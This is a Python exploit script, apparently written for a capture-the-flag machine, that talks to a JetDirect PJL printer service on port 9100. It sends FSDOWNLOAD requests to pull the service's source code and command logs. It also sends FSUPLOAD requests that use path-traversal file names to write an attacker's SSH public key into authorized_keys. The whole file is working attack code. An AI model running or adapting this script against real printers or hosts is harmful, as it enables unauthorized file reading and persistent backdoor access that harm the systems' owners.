#!/usr/bin/env python3
"""Paperwork jetdirect PJL — FSDOWNLOAD source + FSUPLOAD authorized_keys (run ON target as lp)."""
import socket
import sys

HOST, PORT = "127.0.0.1", 9100
SSH_PUB = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"


def talk(payload: bytes, timeout: float = 2.0) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((HOST, PORT))
    s.sendall(payload)
    out = []
    try:
        while True:
            b = s.recv(65536)
            if not b:
                break
            out.append(b)
    except socket.timeout:
        pass
    s.close()
    return b"".join(out)


def main() -> None:
    tests = []

    # FSDOWNLOAD variants
    for name in (
        "jetdirect.py",
        "./jetdirect.py",
        "logs/commands.log",
        "commands.log",
    ):
        tests.append((f'FSDOWNLOAD {name}', f'@PJL FSDOWNLOAD NAME="{name}"\r\n'.encode()))

    # FSUPLOAD variants (authorized_keys path traversal from printer cwd)
    body = SSH_PUB.encode()
    n = len(body)
    names = [
        "pwn.txt",
        "../.ssh/authorized_keys",
        "../../.ssh/authorized_keys",
        ".ssh/authorized_keys",
        "authorized_keys",
    ]
    for name in names:
        hdr = f'@PJL FSUPLOAD NAME="{name}" SIZE={n}\r\n'.encode()
        tests.append((f'FSUPLOAD {name} +FF', hdr + body + b"\x0c"))
        tests.append((f'FSUPLOAD {name} raw', hdr + body))
        tests.append((f'FSUPLOAD {name} CRLF', hdr + body + b"\r\n"))

    uel = b"\x1b%-12345X"
    for label, payload in tests[:18]:
        p = payload
        r = talk(p)
        preview = r[:800].decode(errors="replace").replace("\r", "\\r")
        print(f"--- {label} len={len(r)} ---")
        print(preview or "(empty)")
        if b"def " in r or b"import " in r:
            print(">>> SOURCE <<<")


if __name__ == "__main__":
    main()